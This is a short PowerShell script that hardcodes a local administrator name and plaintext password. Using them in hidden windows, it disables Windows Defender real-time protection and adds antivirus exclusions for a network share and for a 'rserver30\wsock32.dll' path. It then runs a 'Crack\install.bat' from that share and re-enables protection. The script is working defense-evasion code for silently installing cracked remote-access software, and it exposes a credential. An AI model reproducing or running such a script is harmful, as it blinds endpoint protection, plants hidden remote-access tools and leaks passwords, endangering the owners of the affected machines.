
$username = '.\gadmin'
$password = 'Roy@lG@rden57'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
try{
Start-Process powershell.exe -Credential $Credential -ArgumentList ("Set-MpPreference -DisableRealtimeMonitoring $True") -WindowStyle Hidden
Start-Process powershell.exe -Credential $Credential -ArgumentList ("Add-MpPreference -ExclusionPath \\orit01\ITShare\Remote") -WindowStyle Hidden
Start-Process powershell.exe -Credential $Credential -ArgumentList ("Add-MpPreference -ExclusionPath c:\windows\SysWOW64\rserver30\wsock32.dll") -WindowStyle Hidden
}
catch {exit}
Start-Process -FilePath \\orit01\ITShare\Remote\Crack\install.bat -Credential $credential -WindowStyle Hidden
Start-Process powershell.exe -Credential $Credential -ArgumentList ("Set-MpPreference -DisableRealtimeMonitoring $False") -WindowStyle Hidden
